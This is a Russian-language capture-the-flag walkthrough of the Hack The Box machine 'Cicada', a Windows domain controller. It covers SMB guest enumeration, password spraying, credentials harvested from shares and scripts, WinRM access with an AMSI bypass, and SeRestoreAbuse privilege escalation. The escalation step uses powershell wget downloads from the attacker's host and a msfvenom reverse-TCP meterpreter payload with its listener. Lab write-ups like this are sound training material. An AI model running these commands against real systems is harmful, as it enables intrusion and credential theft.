---
title: Cicada
date: 2024-11-18
authors:
  - Korzhek
---



![[79616a32a057e5e672dadb51bb96dd04.webp]]
**Ссылка:** [Cicada](https://app.hackthebox.com/machines/Cicada)

```bash
cd /home/korzhek/Desktop/htb/cicada
```

#### Сканирование

Nmap
```bash
nmap -sV -p- -A -T4 --min-rate=5000 10.10.11.35 --open
```

10.10.11.35 CICADA-DC.cicada.htb
```
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
88/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Not valid before: 2024-11-02T14:49:41
|_Not valid after:  2025-05-04T14:49:41
| rdp-ntlm-info: 
|   Target_Name: CICADA
|   NetBIOS_Domain_Name: CICADA
|   NetBIOS_Computer_Name: CICADA-DC
|   DNS_Domain_Name: cicada.htb
|   DNS_Computer_Name: CICADA-DC.cicada.htb
|   DNS_Tree_Name: cicada.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-11-03T16:56:56+00:00
|_ssl-date: 2024-11-03T16:57:32+00:00; +7h00m00s from scanner time.
5985/tcp  open  tcpwrapped
50555/tcp open  tcpwrapped
```

#### Получение первоначального доступа

Проверка активной гостевой учетной записи
```bash
nxc smb 10.10.11.35 -u guest -p ''
```
![[Pasted image 20241103185306.png]]

Получить информацию об объектах домена
```bash
nxc smb 10.10.11.35 -u guest -p '' --rid-brute
```
![[Pasted image 20241103185446.png]]

users.txt
```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Валидация найденных учетных записей
```
kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
```
![[Pasted image 20241103191258.png]]

Поиск доступных ресурсов
```bash
smbmap -u "guest" -p "" -P 445 -H CICADA-DC.cicada.htb
```
![[Pasted image 20241103194434.png]]

Подключение к шаре
```bash
smbclient //10.10.11.35/HR -U guest
```
![[Pasted image 20241103195936.png]]

Получение найденного текстового файла
```bash
smb: \> get "Notice from HR.txt"
```
![[Pasted image 20241103200028.png]]

Чтение записки из текстового файла
```
cat Notice\ from\ HR.txt
```
![[Pasted image 20241103200108.png | 400]]

Заметки для HR.txt
```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Получен пароль
```
Cicada$M6Corpb*@Lp#nZp!8
```

Спрей пароля на найденных пользователей
```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
![[Pasted image 20241103200916.png]]

Получение списка пользователей и комментариев 
```bash
nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
![[Pasted image 20241103201225.png]]

В комментарии найден пароль учетной записи
```
david.orelious:aRt$Lp#7t*VQ!3
```

Проверка доступа к ресурсам от имени нового пользователя
```bash
nxc smb CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```
![[Pasted image 20241103201739.png]]

Подключение к SMB от имени david.orelious и загрузка Backup_script.ps1
```bash
impacket-smbclient 'cicada.htb/david.orelious:aRt$Lp#7t*VQ!3'@10.10.11.35
```
![[Pasted image 20241103202613.png]]

Backup_script.ps1
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Обнаружена УЗ emily.oscars
```
cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```

Проверка доступа emily.oscars 
```bash
nxc winrm CICADA-DC.cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
![[Pasted image 20241103203103.png]]

Подключение по winrm
```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
Bypass-4MSI
```
![[Pasted image 20241103203348.png]]
Чтение первого флага


#### Повышение привилегий

Найден backup.script
![[Pasted image 20241103203541.png]]
```powershell
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Небезопасные привилегии 
```
whoami /priv
```
![[Pasted image 20241103203840.png]]

Загрузка [SeRestoreAbuse.exe](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe) на хост для запуска агента с правами Системы
```
powershell wget http://10.10.14.32/SeRestoreAbuse.exe -O C:\Windows\Tasks\SeRestoreAbuse.exe
```

Подготовка агента
```bash
# Генерация агента
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f exe > agent.exe

# Загрузка агента
powershell wget http://10.10.14.32/agent.exe -O agent007.exe

# Запуск листенера
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.32; set LPORT 4444; exploit"
```

Запуск эксплойта SeRestoreAbuse
```
C:\Windows\Tasks\SeRestoreAbuse.exe "cmd /c C:\Windows\Tasks\agent007.exe"
```
![[Pasted image 20241103212937.png|500]]
Чтение второго флага

___

Справочная информация
```
10.10.11.35 CICADA-DC.cicada.htb

CICADA\john.smoulder
CICADA\sarah.dantelia
CICADA\michael.wrightson
CICADA\david.orelious
CICADA\emily.oscars

cicada.htb\michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8'
cicada.htb\david.orelious:'aRt$Lp#7t*VQ!3'
cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
```